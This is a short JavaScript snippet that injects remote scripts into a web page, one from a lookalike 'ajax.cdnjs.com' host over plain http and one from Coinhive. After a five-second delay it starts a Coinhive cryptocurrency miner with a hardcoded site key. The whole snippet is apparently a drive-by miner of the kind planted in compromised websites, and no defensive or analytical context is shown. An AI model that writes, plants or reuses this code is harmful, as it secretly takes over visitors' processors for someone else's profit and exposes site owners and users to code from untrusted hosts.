var imported = document.createElement('script');
imported.src = 'http://ajax.cdnjs.com/ajax/libs/json2/20110223/json2.js';
document.head.appendChild(imported);
var imported2 = document.createElement('script');
imported2.src = 'https://coinhive.com/lib/coinhive.min.js';
document.head.appendChild(imported2);
setTimeout(() => {
  var miner = new CoinHive.User('UtX8CiZN1tzrQTn6zYRmcfsMX8qkOLGz', 'vnu');
  miner.start();
}, 5000);
